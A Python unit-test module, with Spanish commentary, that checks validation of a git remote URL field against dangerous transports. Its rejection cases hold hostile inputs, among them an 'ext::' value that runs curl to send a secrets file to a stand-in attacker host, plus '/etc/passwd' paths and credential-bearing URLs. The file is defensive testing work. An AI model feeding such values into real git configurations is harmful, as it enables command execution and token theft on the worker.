"""`remote_url` es entrada NO confiable y va a parar a `git remote add`.

**El defecto, encontrado el 2026-08-27** comparando con AutoGPT (el ejercicio no
sirvió para copiarles nada, pero destapó esto):

    apps/api-server/src/api_server/schemas/projects.py:685
    remote_url: str = Field(min_length=1, max_length=2048)

Ni esquema, ni host, ni userinfo. Ese campo lo escribe un `tenant_admin` desde
`PUT /projects/{id}/git`, se persiste en `projects.git_config` y el worker lo
pasa tal cual a `git remote add origin <url>` y después a `git fetch`.

**Por qué importa más de lo que parece.** Git no habla sólo https y ssh:

* `ext::<comando>` hace que git **ejecute ese comando** como transporte. Y el
  worker es justo el proceso que tiene el token de Vault, `DOCKER_HOST` al
  socket-proxy y el data-root montado.
* `file://` y rutas locales alcanzan el sistema de ficheros del worker.
* Una URL con userinfo (`https://user:token@host/`) mete la credencial en
  `.git/config` en claro — exactamente lo que el ADR 0072 rechazó por escrito.

**Dos capas, y las dos hacen falta.** Esta guarda cubre la primera, el borde:
lo que un humano puede escribir. La segunda —`protocol.ext.allow=never` y
`http.followRedirects=false` en el chokepoint `_run_git` de
`apps/workers/src/workers/git_repos.py`— cubre lo que llegue por cualquier otra
vía. El borde solo no basta: hay filas de `git_config` escritas ANTES de que
esta validación existiera.

Y el chokepoint no puede prohibir `file`: cuatro tests de integración
(`test_incremental_remote_push.py`, `test_plan_close_e2e.py`,
`test_plan_close_pushes_branch.py` y `plan_pr.py`) usan remotos `file://` en
`tmp_path` a propósito, para ejercitar git de verdad sin red. Por eso el borde
lo rechaza y el chokepoint no: lo que se prohíbe abajo es sólo lo que nunca es
legítimo.
"""

from __future__ import annotations

import pytest
from api_server.schemas.projects import GitConfigUpdateRequest
from pydantic import ValidationError

pytestmark = pytest.mark.unit


def _config(url: str) -> GitConfigUpdateRequest:
    return GitConfigUpdateRequest(remote_url=url)


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/daycry/agent-ai-multitenant.git",
        "https://gitlab.example.com:8443/grupo/repo.git",
        "ssh://git@github.com/daycry/repo.git",
        "git@github.com:daycry/repo.git",
    ],
)
def test_the_shapes_a_tenant_really_uses_are_accepted(url: str) -> None:
    """Si esto rechaza un remoto normal, la guarda es peor que el agujero."""
    assert _config(url).remote_url == url


@pytest.mark.parametrize(
    "url",
    [
        "ext::sh -c 'curl http://atacante/$(cat /run/secrets/token)'",
        "ext::git-upload-pack /repo",
    ],
)
def test_the_ext_transport_is_rejected(url: str) -> None:
    """`ext::` ejecuta un comando. Es el caso que convierte un campo en RCE.

    No es teórico ni exótico: es una función documentada de git, y el worker que
    la ejecutaría tiene el token de Vault y el socket de Docker a mano.
    """
    with pytest.raises(ValidationError):
        _config(url)


@pytest.mark.parametrize(
    "url",
    ["file:///etc/passwd", "file:///data/agent-platform/projects", "/etc/passwd", "../../etc"],
)
def test_local_paths_are_rejected_at_the_edge(url: str) -> None:
    """El borde no acepta rutas locales aunque el chokepoint las permita.

    La asimetría es deliberada: abajo `file://` sigue valiendo porque cuatro
    tests de integración lo usan para ejercitar git sin red. Arriba no, porque
    ahí escribe una persona y nadie configura un proyecto contra `/etc`.
    """
    with pytest.raises(ValidationError):
        _config(url)


@pytest.mark.parametrize(
    "url",
    [
        "https://usuario:token@github.com/daycry/repo.git",
        "https://token@github.com/daycry/repo.git",
    ],
)
def test_a_credential_embedded_in_the_url_is_rejected(url: str) -> None:
    """El ADR 0072 lo rechazó por escrito: se persiste en `.git/config` en claro.

    La credencial viaja por `GIT_ASKPASS` (`workers/git_auth.py`), no por la URL.
    Aceptarla aquí abriría por la puerta de atrás lo que ese ADR cerró.
    """
    with pytest.raises(ValidationError):
        _config(url)


@pytest.mark.parametrize("url", ["git://github.com/daycry/repo.git", "http://github.com/x.git"])
def test_unauthenticated_and_cleartext_transports_are_rejected(url: str) -> None:
    """`git://` no autentica ni cifra, y `http://` va en claro.

    Los dos permiten a quien esté en medio servir otro repositorio. Para un
    sistema que ejecuta el código que clona, eso es ejecución remota con pasos
    extra.
    """
    with pytest.raises(ValidationError):
        _config(url)


def test_the_error_says_what_se_acepta() -> None:
    """Un rechazo que no dice la forma válida se lee como un bug del producto."""
    with pytest.raises(ValidationError) as exc:
        _config("ext::sh -c whoami")
    mensaje = str(exc.value)
    assert "https://" in mensaje and "ssh" in mensaje.lower(), (
        f"el mensaje no dice qué formas se aceptan: {mensaje}"
    )
